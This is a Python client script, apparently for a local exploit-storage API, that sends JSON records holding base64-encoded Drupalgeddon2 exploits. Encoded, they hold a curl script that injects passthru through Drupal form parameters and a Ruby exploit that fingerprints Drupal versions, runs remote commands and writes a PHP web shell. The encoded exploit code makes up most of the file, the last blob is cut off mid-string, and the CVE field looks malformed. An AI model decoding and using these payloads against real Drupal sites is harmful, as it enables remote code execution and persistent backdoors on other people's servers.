import requests
import json

headers = {
    "Content-Type": "application/json; charset=utf-8"
}

def ejecutar1(peticion, headers):
    r = requests.post("http://127.0.0.1:3000/exploits-crear",data=json.dumps(peticion), headers=headers)
    print(r.text)

def ejecutar2(peticion, headers):
    r = requests.post("http://127.0.0.1:3000/exploits-volcado",data=json.dumps(peticion), headers=headers)
    print(r.text)

def ejecutar3(peticion, headers):
    r = requests.post("http://127.0.0.1:3000/exploits-individual",data=json.dumps(peticion), headers=headers)
    print(r.text)

def ejecutar4(peticion, headers):
    r = requests.post("http://127.0.0.1:3000/exploits-modificar",data=json.dumps(peticion), headers=headers)
    print(r.text)

def ejecutar5(peticion, headers):
    r = requests.post("http://127.0.0.1:3000/exploits-eliminar",data=json.dumps(peticion), headers=headers)
    print(r.text)

# peticion = {
#     "exploit":"shell_drupalgeddon2.sh",
#     "contenido":"Zm9ybV9idWlsZF9pZD0kKGN1cmwgLWsgLXMgJ0FQUF9TSVRJTy8/cT11c2VyL3Bhc3N3b3JkJm5hbWVcWyUyM3Bvc3RfcmVuZGVyXF1cW1xdPXBhc3N0aHJ1Jm5hbWVcWyUyM3R5cGVcXT1tYXJrdXAmbmFtZVxbJTIzbWFya3VwXF09ZWNobytFeGl0bycgLS1kYXRhICJmb3JtX2lkPXVzZXJfcGFzcyZfdHJpZ2dlcmluZ19lbGVtZW50X25hbWU9bmFtZSIgfCBncmVwIGZvcm1fYnVpbGRfaWQgfCBjdXQgLWQgIlwiIiAtZjYpCmN1cmwgLWsgLWkgIkFQUF9TSVRJTy8/cT1maWxlL2FqYXgvbmFtZS8lMjN2YWx1ZS8ke2Zvcm1fYnVpbGRfaWR9IiAtLWRhdGEgImZvcm1fYnVpbGRfaWQ9JHtmb3JtX2J1aWxkX2lkfSI=",
#     "extension":"sh",
#     "cve":"CVE-2018-002",
#     "software":{
#         "nombre":"Drupal",
#         "version":"7.58"
#     }
# }

# peticion = {
#     "exploit":"shell_drupalgeddon1.sh",
#     "contenido":"Zm9ybV9idWlsZF9pZD0kKGN1cmwgLWsgLXMgJ0FQUF9TSVRJTy8/cT11c2VyL3Bhc3N3b3JkJm5hbWVcWyUyM3Bvc3RfcmVuZGVyXF1cW1xdPXBhc3N0aHJ1Jm5hbWVcWyUyM3R5cGVcXT1tYXJrdXAmbmFtZVxbJTIzbWFya3VwXF09ZWNobytFeGl0bycgLS1kYXRhICJmb3JtX2lkPXVzZXJfcGFzcyZfdHJpZ2dlcmluZ19lbGVtZW50X25hbWU9bmFtZSIgfCBncmVwIGZvcm1fYnVpbGRfaWQgfCBjdXQgLWQgIlwiIiAtZjYpCmN1cmwgLWsgLWkgIkFQUF9TSVRJTy8/cT1maWxlL2FqYXgvbmFtZS8lMjN2YWx1ZS8ke2Zvcm1fYnVpbGRfaWR9IiAtLWRhdGEgImZvcm1fYnVpbGRfaWQ9JHtmb3JtX2J1aWxkX2lkfSI=",
#     "extension":"sh",
#     "cve":"CVE-2018-002",
#     "cms":{
#         "cms_nombre":"Drupal",
#         "cms_categoria":"pluggin",
#         "cms_extension_nombre":"Form 7",
#         "cms_extension_version":"9.8"
#     }
# }
# ejecutar1(peticion, headers)

# peticion = {}
# ejecutar2(peticion, headers)

# peticion = {"exploit":"ruby_drupalgeddon2.rb"}
# ejecutar3(peticion, headers)

peticion = {
    "exploit":"ruby_drupalgeddon2.rb",
    "contenido":"cmVxdWlyZSAnYmFzZTY0JwpyZXF1aXJlICdqc29uJwpyZXF1aXJlICduZXQvaHR0cCcKcmVxdWlyZSAnb3BlbnNzbCcKcmVxdWlyZSAncmVhZGxpbmUnCnJlcXVpcmUgJ2hpZ2hsaW5lL2ltcG9ydCcKIyBTZXR0aW5ncyAtIFRyeSB0byB3cml0ZSBhIFBIUCB0byB0aGUgd2ViIHJvb3Q/CnRyeV9waHBzaGVsbCA9IHRydWUKIyBTZXR0aW5ncyAtIEdlbmVyYWwvU3RlYWx0aAokdXNlcmFnZW50ID0gImRydXBhbGdlZGRvbjIiCndlYnNoZWxsID0gInNoZWxsLnBocCIKIyBTZXR0aW5ncyAtIFByb3h5IGluZm9ybWF0aW9uIChuaWwgdG8gZGlzYWJsZSkKJHByb3h5X2FkZHIgPSBuaWwKJHByb3h5X3BvcnQgPSA4MDgwCiMgU2V0dGluZ3MgLSBQYXlsb2FkICh3ZSBjb3VsZCBqdXN0IGJlIGhhcHB5IHdpdGhvdXQgdGhpcyBQSFAgc2hlbGwsIGJ5IHVzaW5nIGp1c3QgdGhlIE9TIHNoZWxsIC0gYnV0IHRoaXMgaXMgJ2JldHRlcichKQpiYXNoY21kID0gIjw/cGhwIGlmKCBpc3NldCggJF9SRVFVRVNUWydjJ10gKSApIHsgc3lzdGVtKCAkX1JFUVVFU1RbJ2MnXSAuICcgMj4mMScgKTsgfSIKYmFzaGNtZCA9ICJlY2hvICIgKyBCYXNlNjQuc3RyaWN0X2VuY29kZTY0KGJhc2hjbWQpICsgIiB8IGJhc2U2NCAtZCIKIyAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLQojIEZ1bmN0aW9uIGh0dHBfcmVxdWVzdCA8dXJsPiBbdHlwZV0gW2RhdGFdCmRlZiBodHRwX3JlcXVlc3QodXJsLCB0eXBlPSJnZXQiLCBwYXlsb2FkPSIiLCBjb29raWU9IiIpCiAgcHV0cyB2ZXJib3NlKCJIVFRQIC0gVVJMIDogI3t1cmx9IikgaWYgJHZlcmJvc2UKICBwdXRzIHZlcmJvc2UoIkhUVFAgLSBUeXBlOiAje3R5cGV9IikgaWYgJHZlcmJvc2UKICBwdXRzIHZlcmJvc2UoIkhUVFAgLSBEYXRhOiAje3BheWxvYWR9IikgaWYgbm90IHBheWxvYWQuZW1wdHk/IGFuZCAkdmVyYm9zZQogIGJlZ2luCiAgICB1cmkgPSBVUkkodXJsKQogICAgcmVxdWVzdCA9IHR5cGUgPX4gL2dldC8/IE5ldDo6SFRUUDo6R2V0Lm5ldyh1cmkucmVxdWVzdF91cmkpIDogTmV0OjpIVFRQOjpQb3N0Lm5ldyh1cmkucmVxdWVzdF91cmkpCiAgICByZXF1ZXN0LmluaXRpYWxpemVfaHR0cF9oZWFkZXIoeyJVc2VyLUFnZW50IiA9PiAkdXNlcmFnZW50fSkKICAgIHJlcXVlc3QuaW5pdGlhbGl6ZV9odHRwX2hlYWRlcigiQ29va2llIiA9PiBjb29raWUpIGlmIG5vdCBjb29raWUuZW1wdHk/CiAgICByZXF1ZXN0LmJvZHkgPSBwYXlsb2FkIGlmIG5vdCBwYXlsb2FkLmVtcHR5PwogICAgcmV0dXJuICRodHRwLnJlcXVlc3QocmVxdWVzdCkKICByZXNjdWUgU29ja2V0RXJyb3IKICAgIHB1dHMgZXJyb3IoIk5ldHdvcmsgY29ubmVjdGl2aXR5IGlzc3VlIikKICByZXNjdWUgRXJybm86OkVDT05OUkVGVVNFRCA9PiBlCiAgICBwdXRzIGVycm9yKCJUaGUgdGFyZ2V0IGlzIGRvd24gfiAje2UubWVzc2FnZX0iKQogICAgcHV0cyBlcnJvcigiTWF5YmUgdHJ5IGRpc2FibGluZyB0aGUgcHJveHkgKCN7JHByb3h5X2FkZHJ9OiN7JHByb3h5X3BvcnR9KS4uLiIpIGlmICRwcm94eV9hZGRyCiAgcmVzY3VlIFRpbWVvdXQ6OkVycm9yID0+IGUKICAgIHB1dHMgZXJyb3IoIlRoZSB0YXJnZXQgdGltZWQgb3V0IH4gI3tlLm1lc3NhZ2V9IikKICBlbmQKICAjIElmIHdlIGdvdCBoZXJlLCBzb21ldGhpbmcgd2VudCB3cm9uZy4KICBleGl0CmVuZAojIEZ1bmN0aW9uIGdlbl9ldmlsX3VybCA8Y21kPiBbbWV0aG9kXSBbc2hlbGxdIFtwaHBmdW5jdGlvbl0KZGVmIGdlbl9ldmlsX3VybChldmlsLCBlbGVtZW50PSIiLCBzaGVsbD1mYWxzZSwgcGhwZnVuY3Rpb249InBhc3N0aHJ1IikKICBwdXRzIGluZm8oIlBheWxvYWQ6ICN7ZXZpbH0iKSBpZiBub3Qgc2hlbGwKICBwdXRzIHZlcmJvc2UoIkVsZW1lbnQgICAgOiAje2VsZW1lbnR9IikgaWYgbm90IHNoZWxsIGFuZCBub3QgZWxlbWVudC5lbXB0eT8gYW5kICR2ZXJib3NlCiAgcHV0cyB2ZXJib3NlKCJQSFAgZm4gICAgIDogI3twaHBmdW5jdGlvbn0iKSBpZiBub3Qgc2hlbGwgYW5kICR2ZXJib3NlCiAgIyBWdWxuZXJhYmxlIHBhcmFtZXRlcnM6ICNhY2Nlc3NfY2FsbGJhY2sgLyAjbGF6eV9idWlsZGVyIC8gI3ByZV9yZW5kZXIgLyAjcG9zdF9yZW5kZXIKICAjIENoZWNrIHRoZSB2ZXJzaW9uIHRvIG1hdGNoIHRoZSBwYXlsb2FkCiAgaWYgJGRydXBhbHZlcmlvbi5zdGFydF93aXRoPygiOCIpIGFuZCBlbGVtZW50ID09ICJtYWlsIgogICAgIyBNZXRob2QgIzEgLSBEcnVwYWwgdjgueDogbWFpbCwgI3Bvc3RfcmVuZGVyIC0gSFRUUCAyMDAKICAgIHVybCA9ICR0YXJnZXQgKyAkY2xlYW5fdXJsICsgJGZvcm0gKyAiP2VsZW1lbnRfcGFyZW50cz1hY2NvdW50L21haWwvJTIzdmFsdWUmYWpheF9mb3JtPTEmX3dyYXBwZXJfZm9ybWF0PWRydXBhbF9hamF4IgogICAgcGF5bG9hZCA9ICJmb3JtX2lkPXVzZXJfcmVnaXN0ZXJfZm9ybSZfZHJ1cGFsX2FqYXg9MSZtYWlsW2FdWyNwb3N0X3JlbmRlcl1bXT0iICsgcGhwZnVuY3Rpb24gKyAiJm1haWxbYV1bI3R5cGVdPW1hcmt1cCZtYWlsW2FdWyNtYXJrdXBdPSIgKyBldmlsCiAgZWxzaWYgJGRydXBhbHZlcmlvbi5zdGFydF93aXRoPygiOCIpIGFuZCBlbGVtZW50ID09ICJ0aW1lem9uZSIKICAgICMgTWV0aG9kICMyIC0gRHJ1cGFsIHY4Lng6IHRpbWV6b25lLCAjbGF6eV9idWlsZGVyIC0gSFRUUCA1MDAgaWYgcGhwZnVuY3Rpb249ZXhlYyAvLyBIVFRQIDIwMCBpZiBwaHBmdW5jdGlvbj1wYXNzdGhydQogICAgdXJsID0gJHRhcmdldCArICRjbGVhbl91cmwgKyAkZm9ybSArICI/ZWxlbWVudF9wYXJlbnRzPXRpbWV6b25lL3RpbWV6b25lLyUyM3ZhbHVlJmFqYXhfZm9ybT0xJl93cmFwcGVyX2Zvcm1hdD1kcnVwYWxfYWpheCIKICAgIHBheWxvYWQgPSAiZm9ybV9pZD11c2VyX3JlZ2lzdGVyX2Zvcm0mX2RydXBhbF9hamF4PTEmdGltZXpvbmVbYV1bI2xhenlfYnVpbGRlcl1bXT0iICsgcGhwZnVuY3Rpb24gKyAiJnRpbWV6b25lW2FdWyNsYXp5X2J1aWxkZXJdW11bXT0iICsgZXZpbAogICAgI3B1dHMgd2FybmluZygiV0FSTklORzogTWF5IGJlbmVmaXQgdG8gdXNlIGEgUEhQIHdlYiBzaGVsbCIpIGlmIG5vdCB0cnlfcGhwc2hlbGwgYW5kIHBocGZ1bmN0aW9uICE9ICJwYXNzdGhydSIKICBlbHNpZiAkZHJ1cGFsdmVyaW9uLnN0YXJ0X3dpdGg/KCI3IikgYW5kIGVsZW1lbnQgPT0gIm5hbWUiCiAgICAjIE1ldGhvZCAjMyAtIERydXBhbCB2Ny54OiBuYW1lLCAjcG9zdF9yZW5kZXIgLSBIVFRQIDIwMAogICAgdXJsID0gJHRhcmdldCArICIjeyRjbGVhbl91cmx9I3skZm9ybX0mbmFtZVslMjNwb3N0X3JlbmRlcl1bXT0iICsgcGhwZnVuY3Rpb24gKyAiJm5hbWVbJTIzdHlwZV09bWFya3VwJm5hbWVbJTIzbWFya3VwXT0iICsgZXZpbAogICAgcGF5bG9hZCA9ICJmb3JtX2lkPXVzZXJfcGFzcyZfdHJpZ2dlcmluZ19lbGVtZW50X25hbWU9bmFtZSIKICBlbmQKICAjIERydXBhbCB2Ny54IG5lZWRzIGFuIGV4dHJhIHZhbHVlIGZyb20gYSBmb3JtCiAgaWYgJGRydXBhbHZlcmlvbi5zdGFydF93aXRoPygiNyIpCiAgICByZXNwb25zZSA9IGh0dHBfcmVxdWVzdCh1cmwsICJwb3N0IiwgcGF5bG9hZCwgJHNlc3Npb25fY29va2llKQogICAgZm9ybV9uYW1lID0gImZvcm1fYnVpbGRfaWQiCiAgICBwdXRzIHZlcmJvc2UoIkZvcm0gbmFtZSAgOiAje2Zvcm1fbmFtZX0iKSBpZiAkdmVyYm9zZQogICAgZm9ybV92YWx1ZSA9IHJlc3BvbnNlLmJvZHkubWF0Y2goL2lucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iI3tmb3JtX25hbWV9IiB2YWx1ZT0iKC4qKSIvKS50b19zLnNsaWNlKC92YWx1ZT0iKC4qKSIvLCAxKS50b19zLnN0cmlwCiAgICBwdXRzIHdhcm5pbmcoIldBUk5JTkc6IERpZG4ndCBkZXRlY3QgI3tmb3JtX25hbWV9IikgaWYgZm9ybV92YWx1ZS5lbXB0eT8KICAgIHB1dHMgdmVyYm9zZSgiRm9ybSB2YWx1ZSA6ICN7Zm9ybV92YWx1ZX0iKSBpZiAkdmVyYm9zZQogICAgdXJsID0gJHRhcmdldCArICIjeyRjbGVhbl91cmx9ZmlsZS9hamF4L25hbWUvJTIzdmFsdWUvIiArIGZvcm1fdmFsdWUKICAgIHBheWxvYWQgPSAiI3tmb3JtX25hbWV9PSN7Zm9ybV92YWx1ZX0iCiAgZW5kCiAgcmV0dXJuIHVybCwgcGF5bG9hZAplbmQKIyBGdW5jdGlvbiBjbGVhbl9yZXN1bHQgPGlucHV0PgpkZWYgY2xlYW5fcmVzdWx0KGlucHV0KQogICNyZXN1bHQgPSBKU09OLnByZXR0eV9nZW5lcmF0ZShKU09OW3Jlc3BvbnNlLmJvZHldKQogICNyZXN1bHQgPSAkZHJ1cGFsdmVyaW9uLnN0YXJ0X3dpdGg/KCI4Iik/IEpTT04ucGFyc2UoY2xlYW4pWzBdWyJkYXRhIl0gOiBjbGVhbgogIGNsZWFuID0gaW5wdXQudG9fcy5zdHJpcAogICMgUEhQIGZ1bmN0aW9uOiBwYXNzdGhydQogICMgRm9yOiA8cGF5bG9hZD5beyJjb21tYW5kIjoiaW5zZXJ0IiwibWV0aG9kIjoicmVwbGFjZVdpdGgiLCJzZWxlY3RvciI6bnVsbCwiZGF0YSI6Ilx1MDAzQ3NwYW4gY2xhc3M9XHUwMDIyYWpheC1uZXctY29udGVudFx1MDAyMlx1MDAzRVx1MDAzQ1wvc3Bhblx1MDAzRSIsInNldHRpbmdzIjpudWxsfV0KICBjbGVhbi5zbGljZSEoL1xbeyJjb21tYW5kIjoiLip9XF0kLykKICAjIFBIUCBmdW5jdGlvbjogZXhlYwogICMgRm9yOiBbeyJjb21tYW5kIjoiaW5zZXJ0IiwibWV0aG9kIjoicmVwbGFjZVdpdGgiLCJzZWxlY3RvciI6bnVsbCwiZGF0YSI6IjxwYXlsb2FkPlx1MDAzQ3NwYW4gY2xhc3M9XHUwMDIyYWpheC1uZXctY29udGVudFx1MDAyMlx1MDAzRVx1MDAzQ1wvc3Bhblx1MDAzRSIsInNldHRpbmdzIjpudWxsfV0KICAjY2xlYW4uc2xpY2UhKC9cW3siY29tbWFuZCI6Ii4qZGF0YSI6Ii8pCiAgI2NsZWFuLnNsaWNlISgvXFx1MDAzQ3NwYW4gY2xhc3M9XFx1MDAyMi4qfVxdJC8pCiAgIyBOZXdlciBQSFAgZm9yIGFuIG9sZGVyIERydXBhbAogICMgRm9yOiA8Yj5EZXByZWNhdGVkPC9iPjogIGFzc2VydCgpOiBDYWxsaW5nIGFzc2VydCgpIHdpdGggYSBzdHJpbmcgYXJndW1lbnQgaXMgZGVwcmVjYXRlZCBpbiA8Yj4vdmFyL3d3dy9odG1sL2NvcmUvbGliL0RydXBhbC9Db3JlL1BsdWdpbi9EZWZhdWx0UGx1Z2luTWFuYWdlci5waHA8L2I+IG9uIGxpbmUgPGI+MTUxPC9iPjxiciAvPgogICNjbGVhbi5zbGljZSEoLzxiPi4qPGJyIFwvPi8pCiAgIyBEcnVwYWwgdjgueCBNZXRob2QgIzIgfiB0aW1lem9uZSwgI2xhenlfYnVpbGRlciwgcGFzc3RocnUsIEhUVFAgNTAwCiAgIyBGb3I6IDxiPkRlcHJlY2F0ZWQ8L2I+OiAgYXNzZXJ0KCk6IENhbGxpbmcgYXNzZXJ0KCkgd2l0aCBhIHN0cmluZyBhcmd1bWVudCBpcyBkZXByZWNhdGVkIGluIDxiPi92YXIvd3d3L2h0bWwvY29yZS9saWIvRHJ1cGFsL0NvcmUvUGx1Z2luL0RlZmF1bHRQbHVnaW5NYW5hZ2VyLnBocDwvYj4gb24gbGluZSA8Yj4xNTE8L2I+PGJyIC8+CiAgY2xlYW4uc2xpY2UhKC9UaGUgd2Vic2l0ZSBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGVycm9yLiovKQogIHJldHVybiBjbGVhbgplbmQKIyBGZWVkYmFjayB3aGVuIHNvbWV0aGluZyBnb2VzIHJpZ2h0CmRlZiBzdWNjZXNzKHRleHQpCiAgIyBHcmVlbgogIHJldHVybiAiXGVbI3szMn1tWytdXGVbMG0gI3t0ZXh0fSIKZW5kCiMgRmVlZGJhY2sgd2hlbiBzb21ldGhpbmcgZ29lcyB3cm9uZwpkZWYgZXJyb3IodGV4dCkKICAjIFJlZAogIHJldHVybiAiXGVbI3szMX1tWy1dXGVbMG0gI3t0ZXh0fSIKZW5kCiMgRmVlZGJhY2sgd2hlbiBzb21ldGhpbmcgbWF5IGhhdmUgaXNzdWVzCmRlZiB3YXJuaW5nKHRleHQpCiAgIyBZZWxsb3cKICByZXR1cm4gIlxlWyN7MzN9bVshXVxlWzBtICN7dGV4dH0iCmVuZAojIEZlZWRiYWNrIHdoZW4gc29tZXRoaW5nIGRvaW5nIHNvbWV0aGluZwpkZWYgYWN0aW9uKHRleHQpCiAgIyBCbHVlCiAgcmV0dXJuICJcZVsjezM0fW1bKl1cZVswbSAje3RleHR9IgplbmQKIyBGZWVkYmFjayB3aXRoIGhlbHBmdWwgaW5mb3JtYXRpb24KZGVmIGluZm8odGV4dCkKICAjIExpZ2h0IGJsdWUKICByZXR1cm4gIlxlWyN7OTR9bVtpXVxlWzBtICN7dGV4dH0iCmVuZAojIEZlZWRiYWNrIGZvciB0aGUgb3ZlcmtpbGwKZGVmIHZlcmJvc2UodGV4dCkKICAjIERhcmsgZ3JleQogIHJldHVybiAiXGVbI3s5MH1tW3ZdXGVbMG0gI3t0ZXh0fSIKZW5kCiMgLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0KZGVmIGluaXRfYXV0aGVudGljYXRpb24oKQogICR1bmFtZSA9IGFzaygnRW50ZXIgeW91ciB1c2VybmFtZTogICcpIHsgfHF8IHEuZWNobyA9IGZhbHNlIH0KICAkcGFzc3dkID0gYXNrKCdFbnRlciB5b3VyIHBhc3N3b3JkOiAgJykgeyB8cXwgcS5lY2hvID0gZmFsc2UgfQogICR1bmFtZV9maWVsZCA9IGFzaygnRW50ZXIgdGhlIG5hbWUgb2YgdGhlIHVzZXJuYW1lIGZvcm0gZmllbGQ6ICAnKSB7IHxxfCBxLmVjaG8gPSB0cnVlIH0KICAkcGFzc3dkX2ZpZWxkID0gYXNrKCdFbnRlciB0aGUgbmFtZSBvZiB0aGUgcGFzc3dvcmQgZm9ybSBmaWVsZDogICcpIHsgfHF8IHEuZWNobyA9IHRydWUgfQogICRsb2dpbl9wYXRoID0gYXNrKCdFbnRlciB5b3VyIGxvZ2luIHBhdGggKGUuZy4sIHVzZXIvbG9naW4pOiAgJykgeyB8cXwgcS5lY2hvID0gdHJ1ZSB9CiAgJGNyZWRzX3N1ZmZpeCA9IGFzaygnRW50ZXIgdGhlIHN1ZmZpeCBldmVudHVhbGx5IHJlcXVpcmVkIGFmdGVyIHRoZSBjcmVkZW50aWFscyBpbiB0aGUgbG9naW4gSFRUUCBQT1NUIHJlcXVlc3QgKGUuZy4sICZmb3JtX2lkPS4uLik6ICAnKSB7IHxxfCBxLmVjaG8gPSB0cnVlIH0KZW5kCmRlZiBpc19hcmcoYXJncywgcGFyYW0pCiAgYXJncy5lYWNoIGRvIHxhcmd8CiAgICBpZiBhcmcgPT0gcGFyYW0KICAgICAgcmV0dXJuIHRydWUKICAgIGVuZAogIGVuZAogIHJldHVybiBmYWxzZQplbmQKIyBRdWljayBob3cgdG8gdXNlCmRlZiB1c2FnZSgpCiAgcHV0cyAnVXNhZ2U6IHJ1YnkgZHJ1cGFsZ2dlZG9uMi5yYiA8dGFyZ2V0PiBbLS1hdXRoZW50aWNhdGlvbl0gWy0tdmVyYm9zZV0nCiAgcHV0cyAnRXhhbXBsZSBmb3IgdGFyZ2V0IHRoYXQgZG9lcyBub3QgcmVxdWlyZSBhdXRoZW50aWNhdGlvbjonCiAgcHV0cyAnICAgICAgIHJ1YnkgZHJ1cGFsZ2VkZG9uMi5yYiBodHRwczovL2V4YW1wbGUuY29tJwogIHB1dHMgJ0V4YW1wbGUgZm9yIHRhcmdldCB0aGF0IGRvZXMgcmVxdWlyZSBhdXRoZW50aWNhdGlvbjonCiAgcHV0cyAnICAgICAgIHJ1YnkgZHJ1cGFsZ2VkZG9uMi5yYiBodHRwczovL2V4YW1wbGUuY29tIC0tYXV0aGVudGljYXRpb24nCmVuZAokdGFyZ2V0ID0gJ0FQUF9TSVRJTycgKyAnLycKaW5pdF9hdXRoZW50aWNhdGlvbigpIGlmIGlzX2FyZyhBUkdWLCAnLS1hdXRoZW50aWNhdGlvbicpCiR2ZXJib3NlID0gaXNfYXJnKEFSR1YsICctLXZlcmJvc2UnKQojIENoZWNrIGlucHV0IGZvciBwcm90b2NvbAokdGFyZ2V0ID0gImh0dHA6Ly8jeyR0YXJnZXR9IiBpZiBub3QgJHRhcmdldC5zdGFydF93aXRoPygiaHR0cCIpCiMgQ2hlY2sgaW5wdXQgZm9yIHRoZSBlbmQKJHRhcmdldCArPSAiLyIgaWYgbm90ICR0YXJnZXQuZW5kX3dpdGg/KCIvIikKIyAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLQojIEJhbm5lcgpwdXRzIGFjdGlvbigiLS09PVs6OiNEcnVwYWxnZ2Vkb24yOjpdPT0tLSIpCnB1dHMgIi0iKjgwCnB1dHMgaW5mbygiVGFyZ2V0IDogI3skdGFyZ2V0fSIpCnB1dHMgaW5mbygiUHJveHkgIDogI3skcHJveHlfYWRkcn06I3skcHJveHlfcG9ydH0iKSBpZiAkcHJveHlfYWRkcgpwdXRzIGluZm8oIldyaXRlPyA6IFNraXBwaW5nIHdyaXRpbmcgUEhQIHdlYiBzaGVsbCIpIGlmIG5vdCB0cnlfcGhwc2hlbGwKcHV0cyAiLSIqODAKIyAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLQojIFNldHVwIGNvbm5lY3Rpb24KdXJpID0gVVJJKCR0YXJnZXQpCiRodHRwID0gTmV0OjpIVFRQLm5ldyh1cmkuaG9zdCwgdXJpLnBvcnQsICRwcm94eV9hZGRyLCAkcHJveHlfcG9ydCkKIyBVc2UgU1NML1RMUyBpZiBuZWVkZWQKaWYgdXJpLnNjaGVtZSA9PSAiaHR0cHMiCiAgJGh0dHAudXNlX3NzbCA9IHRydWUKICAkaHR0cC52ZXJpZnlfbW9kZSA9IE9wZW5TU0w6OlNTTDo6VkVSSUZZX05PTkUKZW5kCiRzZXNzaW9uX2Nvb2tpZSA9ICcnCiMgSWYgYXV0aGVudGljYXRpb24gcmVxdWlyZWQgdGhlbiBsb2dpbiBhbmQgZ2V0IHNlc3Npb24gY29va2llCmlmICR1bmFtZQogICRwYXlsb2FkID0gJHVuYW1lX2ZpZWxkICsgJz0nICsgJHVuYW1lICsgJyYnICsgJHBhc3N3ZF9maWVsZCArICc9JyArICRwYXNzd2QgKyAkY3JlZHNfc3VmZml4CiAgcmVzcG9uc2UgPSBodHRwX3JlcXVlc3QoJHRhcmdldCArICRsb2dpbl9wYXRoLCAncG9zdCcsICRwYXlsb2FkLCAkc2Vzc2lvbl9jb29raWUpCiAgaWYgKHJlc3BvbnNlLmNvZGUgPT0gJzIwMCcgb3IgcmVzcG9uc2UuY29kZSA9PSAnMzAzJykgYW5kIG5vdCByZXNwb25zZS5ib2R5LmVtcHR5PyBhbmQgcmVzcG9uc2VbJ3NldC1jb29raWUnXQogICAgJHNlc3Npb25fY29va2llID0gcmVzcG9uc2VbJ3NldC1jb29raWUnXS5zcGxpdCgnOyAnKVswXQogICAgcHV0cyBzdWNjZXNzKCJMb2dnZWQgaW4gLSBTZXNzaW9uIENvb2tpZSA6ICN7JHNlc3Npb25fY29va2llfSIpCiAgZW5kCmVuZAojIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtCiMgVHJ5IGFuZCBnZXQgdmVyc2lvbgokZHJ1cGFsdmVyaW9uID0gIiIKIyBQb3NzaWJsZSBVUkxzCnVybCA9IFsKICAjIC0tLSBjaGFuZ2Vsb2cgLS0tCiAgIyBEcnVwYWwgdjYueCAvIHY3LnggWzIwMF0KICAkdGFyZ2V0ICsgIkNIQU5HRUxPRy50eHQiLAogICMgRHJ1cGFsIHY4LnggWzIwMF0KICAkdGFyZ2V0ICsgImNvcmUvQ0hBTkdFTE9HLnR4dCIsCiAgIyAtLS0gYm9vdHN0cmFwIC0tLQogICMgRHJ1cGFsIHY3LnggLyB2Ni54IFs0MDNdCiAgJHRhcmdldCArICJpbmNsdWRlcy9ib290c3RyYXAuaW5jIiwKICAjIERydXBhbCB2OC54IFs0MDNdCiAgJHRhcmdldCArICJjb3JlL2luY2x1ZGVzL2Jvb3RzdHJhcC5pbmMiLAogICMgLS0tIGRhdGFiYXNlIC0tLQogICMgRHJ1cGFsIHY3LnggLyB2Ni54ICBbNDAzXQogICR0YXJnZXQgKyAiaW5jbHVkZXMvZGF0YWJhc2UuaW5jIiwKICAjIERydXBhbCB2Ny54IFs0MDNdCiAgIyR0YXJnZXQgKyAiaW5jbHVkZXMvZGF0YWJhc2UvZGF0YWJhc2UuaW5jIiwKICAjIERydXBhbCB2OC54IFs0MDNdCiAgIyR0YXJnZXQgKyAiY29yZS9pbmNsdWRlcy9kYXRhYmFzZS5pbmMiLAogICMgLS0tIGxhbmRpbmcgcGFnZSAtLS0KICAjIERydXBhbCB2OC54IC8gdjcueCBbMjAwXQogICR0YXJnZXQsCl0KIyBDaGVjayBhbGwKdXJsLmVhY2ggZG98dXJpfAogICMgQ2hlY2sgcmVzcG9uc2UKICByZXNwb25zZSA9IGh0dHBfcmVxdWVzdCh1cmksICdnZXQnLCAnJywgJHNlc3Npb25fY29va2llKQogICMgQ2hlY2sgaGVhZGVyCiAgaWYgcmVzcG9uc2VbJ1gtR2VuZXJhdG9yJ10gYW5kICRkcnVwYWx2ZXJpb24uZW1wdHk/CiAgICBoZWFkZXIgPSByZXNwb25zZVsnWC1HZW5lcmF0b3InXS5zbGljZSgvRHJ1cGFsICguKikgXChodHRwczpcL1wvd3d3LmRydXBhbC5vcmdcKS8sIDEpLnRvX3Muc3RyaXAKICAgIGlmIG5vdCBoZWFkZXIuZW1wdHk/CiAgICAgICRkcnVwYWx2ZXJpb24gPSAiI3toZWFkZXJ9LngiIGlmICRkcnVwYWx2ZXJpb24uZW1wdHk/CiAgICAgIHB1dHMgc3VjY2VzcygiSGVhZGVyIDogdiN7aGVhZGVyfSBbWC1HZW5lcmF0b3JdIikKICAgICAgcHV0cyB2ZXJib3NlKCJYLUdlbmVyYXRvcjogI3tyZXNwb25zZVsnWC1HZW5lcmF0b3InXX0iKSBpZiAkdmVyYm9zZQogICAgZW5kCiAgZW5kCiAgIyBDaGVjayByZXF1ZXN0IHJlc3BvbnNlLCB2YWxpZAogIGlmIHJlc3BvbnNlLmNvZGUgPT0gIjIwMCIKICAgIHRtcCA9ICR2ZXJib3NlID8gICIgICAgW0hUVFAgU2l6ZTogI3tyZXNwb25zZS5zaXplfV0iICA6ICIiCiAgICBwdXRzIHN1Y2Nlc3MoIkZvdW5kICA6ICN7dXJpfSAgICAoSFRUUCBSZXNwb25zZTogI3tyZXNwb25zZS5jb2RlfSkje3RtcH0iKQogICAgIyBDaGVjayB0byBzZWUgaWYgaXQgc2F5czogVGhlIHJlcXVlc3RlZCBVUkwgImh0dHA6Ly88VVJMPiIgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci4KICAgIHB1dHMgd2FybmluZygiV0FSTklORzogQ291bGQgYmUgYSBmYWxzZS1wb3NpdGl2ZSBbMS0xXSwgYXMgdGhlIGZpbGUgY291bGQgYmUgcmVwb3J0ZWQgdG8gYmUgbWlzc2luZyIpIGlmIHJlc3BvbnNlLmJvZHkuZG93bmNhc2UuaW5jbHVkZT8gIndhcyBub3QgZm91bmQgb24gdGhpcyBzZXJ2Z